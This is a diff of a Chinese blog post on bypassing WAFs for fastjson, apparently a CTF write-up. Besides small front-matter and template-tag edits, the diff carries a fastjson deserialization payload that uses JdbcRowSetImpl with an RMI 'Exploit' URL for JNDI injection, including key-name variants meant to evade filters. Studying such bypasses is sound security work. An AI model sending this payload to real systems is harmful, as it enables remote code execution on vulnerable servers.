@@ -2,6 +2,7 @@
 title: fastjson WAF绕过方式
 date: '2026-01-19 11:20:26'
 updated: '2026-01-19 15:15:50'
+abbrlink: 3c9612f8
 ---
 <!--more--> 
 # 题目
@@ -173,7 +174,7 @@ if (ch == '"') {
 ![](../../images/posts/4da450849d952be81f9e007fe2e5c618.png)
 
 ```plain
-{"a": {"@type": "java.lang.Class","val": "com.sun.rowset.JdbcRowSetImpl"},"b": {"@type": "com.sun.rowset.JdbcRowSetImpl","isdataSourceName": "rmi://127.0.0.1:1099/Exploit","isautoCommit": true}}{% endraw %}
+{"a": {"@type": "java.lang.Class","val": "com.sun.rowset.JdbcRowSetImpl"},"b": {"@type": "com.sun.rowset.JdbcRowSetImpl","isdataSourceName": "rmi://127.0.0.1:1099/Exploit","isautoCommit": true{% raw %}}}{% endraw %}
 ```
 
 ## [](#高级篇)高级篇
